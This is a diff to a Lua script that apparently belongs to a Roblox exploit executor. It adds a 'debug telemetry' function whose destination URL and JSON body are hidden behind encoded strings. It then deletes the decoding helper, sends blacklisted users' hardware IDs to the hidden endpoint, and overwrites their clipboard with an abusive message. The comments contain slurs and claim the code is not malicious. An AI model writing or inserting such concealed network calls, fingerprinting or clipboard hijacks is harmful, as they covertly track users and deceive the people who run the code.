@@ -15,22 +15,54 @@ local async = {
 	end
 };
 
+--// this isnt malicious, it is an url that i post data to where i can debug better.
+--// any uses of this are all in this file or the ui file.
+--// with the full code of the sender being below.
+local http_post = game.HttpPost;
+local securestring = clonefunction(dtc.securestring);
+local DEBUGLOGS_URL = securestring("Szc3MzD5DAxHSjBATDFHDUBMTgxCM0oMNEZBS0xMSDAM8vD0+vr6+vf08vH09Pr1+vf6+gxRYPM180pPRjpRSzZKM0X3+037R1fxZ/pUb1Y2OzFpVllL8Tn3RzkxU0dmQvVBTvFuYfptDk5W91kOVkdGUm4wQEFUYg==");
+function send_debug(what, why, from)
+    local sendbody = securestring("OCkDAwMDATc6M0YB+QPzDykDAwMDAUBMTTdGTTcB+QMBAQ8pAwMDAwFORk03SkxNMAH5A1heDykDAwMDAU5GTTdKTE1cMUxPRjAB+QNYXg8pAwMDAwFCNzdCQEtORk03MAH5A1heDykDAwMDAUZOQUZHMAH5A1gpAwMDAwMDAwM4KQMDAwMDAwMDAwMDAwE3OjNGAfkDATFKQEsBDykDAwMDAwMDAwMDAwMBN0o3T0YB+QMBBjABDykDAwMDAwMDAwMDAwMBR0YwQDFKMzdKTE0B+QMBBjABDykDAwMDAwMDAwMDAwMBQExPTDEB+QPy9fTy8vrw9g8pAwMDAwMDAwMDAwMDAUI2N0tMMQH5AzgpAwMDAwMDAwMDAwMDAwMDAwFNQk5GAfkDAQYwASkDAwMDAwMDAwMDAwM+DykDAwMDAwMDAwMDAwMBQExNN0ZNN1wwQEJNXDVGMTBKTE0B+QPzKQMDAwMDAwMDPikDAwMDXg8pAwMDAwE3Sk5GMDdCTjMB+QMB8fPx9g7z9Q7z9lfz8fn39fn29Q32+/Dz8/MI8/P58/MBDykDAwMDAUZHSjdGR1w3Sk5GMDdCTjMB+QNNNk9PDykDAwMDAUVPQkQwAfkD8w8pAwMDAwFATE4zTE1GTTcwAfkDWF4PKQMDAwMBSkcB+QMB8vD78/Py9vPz9/T6+vP09/D29wEPKQMDAwMBQEtCTU1GT1xKRwH5AwHy8PT6+vr79fr09/L19/H29vLwAQ8pAwMDAwFCNjdLTDEB+QM4KQMDAwMDAwMDAUpHAfkDAfLw9Pr6+vr39PLx9PT69fr3+voBDykDAwMDAwMDAwE2MEYxTUJORgH5AwFXZm9mbmZXUVoBDykDAwMDAwMDAwFCNUI3QjEB+QMBR/r7QUFF8fbw8/VGR/ZC9kdF+/pG8vTyQvP1R/XyRvABDykDAwMDAwMDAwFHSjBAMUpOSk1CN0wxAfkDAfPz8/MBDykDAwMDAwMDAwEzNkFPSkBcRU9CRDAB+QPzDykDAwMDAwMDAwFFT0JEMAH5A/MPKQMDAwMDAwMDAUFMNwH5AzcxNkYPKQMDAwMDAwMDAURPTEFCT1xNQk5GAfkDTTZPTw8pAwMDAwMDAwMBQE9CTQH5A002T08PKQMDAwMDAwMDATMxSk5CMTpcRDZKT0cB+QNNNk9PKQMDAwM+DykDAwMDATNKTU1GRwH5A0VCTzBGDykDAwMDAU5GTTdKTE1cRjVGMTpMTUYB+QNFQk8wRg8pAwMDAwE3NzAB+QNFQk8wRg8pAwMDAwE0RkFLTExIXEpHAfkDAfLw9Pr6+vr39PLx9PT69fr3+voBKT4=");
+	
+	--// its legit a body, wasnt going to be hidden but retards will retard.
+	local fmt = string.format(sendbody, what, why, from);
+    http_post(game, DEBUGLOGS_URL, fmt, "application/json");
+    
+	rconsolewarn("sent telemetry data");
+end
+
 local get_counter = 0;
 local http_get = function(url)
     local r = http_request({ Url = url });
     if r.Success then
+        get_counter = 0;
         return r.Body;
     end
     
     --// we might have to retry, none of our requests are meant to fail.
     --// debugging info
     
-    warn("http_get fail");
-    warn(r.Success, r.StatusCode, r.StatusMessage, r.Body);
+    --//game:GetService'StarterGui':SetCore("DevConsoleVisible", true)
+    warn("HTTPGET FAIL REPORT THIS TO DEVS");
+    warn(r.Success, r.StatusCode, r.StatusMessage, #r.Body);
     
+    send_debug("http_get fail", string.format("Success: %s | Status: %s (%s) | Body Size: %s",
+        tostring(r.Success),
+        tostring(r.StatusCode),
+        r.StatusMessage or "No message",
+        tostring(#r.Body)
+    ), "HTTPGETFAIL");
+
     --// in prod this should never fail unless it timed out or had 429 ( for some reason..)
     if get_counter > 5 then
         get_counter = 0;
+        
+        send_debug("http_get failcountexceeded", string.format("Success: %s | Status: %s (%s) | Body Size: %s",
+	        tostring(r.Success),
+	        tostring(r.StatusCode),
+	        r.StatusMessage or "No message",
+	        tostring(#r.Body)
+	    ), "HTTPGETCOUNT");
         return 123456; --// our stuff will error with a number type.
     end
     
@@ -98,6 +130,11 @@ local writin = dtc.write_internal or writefile;
 local ridin = dtc.read_internal or readfile;
 local isin = dtc.is_internal or isfile;
 
+setreadonly(dtc, false);
+dtc.securestring = nil;
+dtc._securestring = nil;
+setreadonly(dtc, true);
+
 --// lets avoid them oke
 
 local function save_key(key)
@@ -119,6 +156,7 @@ local is_retard = function()
 end
 
 if is_retard() then
+    send_debug("retardalert", string.format("retard blocked, hwid %s", mystupidhwid), "RETARD");
 	dtc.shameretard("blacklisted lololololollol");
 	setclipboard("i am so fucking retarded that i had to fucking fuck my fucking self over fucking beta because im fuckingly fucking stupid.");
 	getrendersteppedlist(); --// purpsoefully broken, will fix if any script starts using it.
